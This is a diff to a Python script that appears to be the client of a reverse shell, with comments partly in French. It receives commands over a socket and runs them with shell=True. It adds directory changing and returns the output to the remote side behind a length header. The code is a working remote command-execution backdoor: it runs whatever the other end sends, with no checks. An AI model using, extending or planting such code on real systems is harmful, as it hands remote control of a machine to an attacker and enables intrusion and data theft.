@@ -28,26 +28,36 @@ while True:
         break
     command = command_data.decode()
     print("Command : ", command)
-    
+    # handles file path
+    commande_split = command.split(" ")        
     if command == "infos":
         response = platform.platform() + " " + os.getcwd()
+    # handles not directory    
+    elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            # .strip("'") handles the case where you drag a folder into the shell on mac
+            os.chdir(commande_split[1].strip("'"))
+            response = " "
+        except FileNotFoundError:
+            response = "ERREUR : ce répertoire n'exite pas"
     else:
-        response =  subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
+        response = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
         response = response.stdout + response.stderr
-    
         if not response or len(response) == 0:
             response = " "
-            
-# Gestion des commandes trop longues: 
-# HEADER 13 octets -> longueur data
-# DATA (longueur) octets 
+           
+    # handles too long command: 
+    # HEADER 13 octets -> len data
+    # DATA (len) octets 
 
-# ex : HEADER 0000000002024
-#      DATA (2024) octets
-    header = str(len(response.encode())).zfill(13)
+    # ex : HEADER 0000000002024
+    #      DATA (2024) octets
+    data_len = len(response.encode())
+    header = str(data_len).zfill(13)
     print(f'HEADER : {header}')
     s.sendall(header.encode())
-    s.sendall(response.encode())
+    if data_len > 0:
+        s.sendall(response.encode())
 
 
 s.close()
